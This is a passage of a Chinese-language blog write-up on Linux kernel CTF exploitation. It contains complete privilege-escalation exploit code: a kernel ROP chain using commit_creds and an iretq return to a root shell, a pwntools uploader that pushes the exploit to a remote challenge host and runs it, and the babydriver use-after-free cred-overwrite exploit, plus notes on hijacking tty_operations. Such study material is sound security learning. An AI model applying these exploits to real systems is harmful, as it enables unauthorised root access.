class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">EoP</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">	<span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">	(*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">	saveStatus();</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/test&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /dev/test !\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	FILE* sym_table_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">size_t</span> addr;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            		<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> offset = commit_creds - <span class="number">0xffffffff810ccc30</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">size_t</span> canary ;</span><br><span class="line">	read(fd, buf, <span class="number">0x40</span>);</span><br><span class="line">	canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="type">size_t</span> rop_chain[<span class="number">20</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		rop_chain[i] = canary;</span><br><span class="line">	&#125;</span><br><span class="line">	rop_chain[i++] = (<span class="type">size_t</span>)EoP;</span><br><span class="line">	rop_chain[i++] = SWAPGS_POPRBP_RET+offset;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = IRETQ+offset;</span><br><span class="line">	rop_chain[i++] = (<span class="type">size_t</span>)getRootShell;</span><br><span class="line">	rop_chain[i++] = user_cs;</span><br><span class="line">	rop_chain[i++] = user_rflags;</span><br><span class="line">	rop_chain[i++] = user_sp;</span><br><span class="line">	rop_chain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">	write(fd,rop_chain, <span class="number">0x300</span>);</span><br><span class="line">	ioctl(fd, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>传文件的脚本</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">53035</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;tar -czvf exp.tar.gz ./exp&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;echo &#x27;&#x27; &gt; /tmp/b64_exp;&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;now line: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">    line = f.readline().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)&lt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cmd = <span class="string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="string">b&quot;&#x27; &gt;&gt; /tmp/b64_exp;&quot;</span></span><br><span class="line">    p.sendline(cmd) <span class="comment"># send lines</span></span><br><span class="line">    <span class="comment">#time.sleep(0.02)</span></span><br><span class="line">    <span class="comment">#p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;/ $&quot;</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;base64 -d /tmp/b64_exp &gt; /tmp/exp.tar.gz;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;cd tmp&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;chmod +x exp;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>为了减少传输文件的大小，可以考虑用<code>musl-gcc</code>进行编译</p>
+<h2 id="Kernel-UAF"><a href="#Kernel-UAF" class="headerlink" title="Kernel UAF"></a>Kernel UAF</h2><p>效果还是造成两指针指向同一内存，用户态的堆题一般就是考虑劫持hook和一些io指针，到了内核大方向还是一致的，通过劫持一些指针控制程序流</p>
+<p>在老版本的kernel可以通过UAF漏洞劫持新进程的cred结构体，通过修改<code>uid,gid</code>提权到root</p>
+<p>更通用的方式是劫持<code>tty_operations</code>，有点像用户态上劫持io指针的感觉</p>
+<h3 id="2017CISCN-babydriver"><a href="#2017CISCN-babydriver" class="headerlink" title="[2017CISCN]babydriver"></a>[2017CISCN]babydriver</h3><p>给的内核版本比较老了，简单打法先构造出UAF，释放掉object，fork出新的进程，那么内核中该空闲的object会被分配给新进程作为cred结构体，UAF漏洞修改<code>uid,gid</code>提权</p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">	ioctl(fd1, <span class="number">65537</span>, <span class="number">0xa8</span>);</span><br><span class="line">	close(fd1);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> pid = fork();</span><br><span class="line">	<span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span>* buf[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		write(fd2, buf, <span class="number">28</span>);</span><br><span class="line">		<span class="keyword">if</span>(getuid())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里主要分析劫持<code>tty_operations</code>这一方法</p>
+<p>当我们打开<code>/dev/ptmx</code>时会在内核分配一个<code>tty_struct</code>结构体，关闭时该结构体会被释放回slub</p>
+<p><code>tty_struct</code>定义</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>    magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span>    <span class="comment">/* class device or NULL (e.g. ptys, serdev) */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">    <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="type">bool</span> stopped;</span><br><span class="line">        <span class="type">bool</span> tco_stopped;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) flow;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">spinlock_t</span> lock;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> pktstatus;</span><br><span class="line">        <span class="type">bool</span> packet;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> unused[<span class="number">0</span>];</span><br><span class="line">    &#125; __aligned(<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)) ctrl;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hw_stopped;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="type">void</span> *disc_data;</span><br><span class="line">    <span class="type">void</span> *driver_data;</span><br><span class="line">    <span class="type">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> closing;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">    <span class="type">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Each of a tty&#x27;s open files has private_data pointing to tty_file_private */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tty magic number */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_MAGIC        0x5401</span></span><br></pre></td></tr></table></figure></div>
+<p>注意到结构体中的一个函数表<code>tty_operations</code>，这是一个内核地址，可以泄露绕kaslr，同时在做read write等操作时都会通过索引<code>tty_ops</code>里的指针实现功能</p>
+<p><code>tty_ops</code>定义</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">    <span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">              <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">    <span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*write_room)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*chars_in_buffer)</span><span class="params">(<span class="keyword">struct</span> tty_struct *tty)</span>;</span><br><span class="line">    <span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                 <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">    <span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">    <span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">    <span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">    <span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">    <span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">                <span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line">    <span class="type">int</span>  (*get_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">int</span>  (*set_serial)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> serial_struct *p);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> seq_file *m);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">    <span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">    <span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> (*proc_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
+<p>经调试发现当调用ptmx的write时rax是<code>tty_ops</code>的值，如果我们劫持write指针为<code>mov rsp, rax</code>这种类型的gadget就可以实现栈迁移，但是迁移到<code>tty_ops</code>上写rop的长度不够，所以这里可以利用<code>pop rax</code>后接用户态上构造的rop链地址再来一次<code>mov rsp, rax</code>，因为这里开启了smep但是没开smap，所以把栈迁移到用户态没有问题</p>
+<p>这里得用ropgadget找，一开始用ropper没找到，并且找到的形式长这样<code>mov rsp, rax; dec rbp; jmp xxx</code>，后面跳转的地址也找不着，索性直接调试</p>
+<p>调试的话断点打在gadget上</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://picture-1311455354.cos.ap-shanghai.myqcloud.com/image-20230127205016530.png" alt></p>
+<p>si步入，避免跑飞</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://picture-1311455354.cos.ap-shanghai.myqcloud.com/image-20230127205039367.png" alt></p>
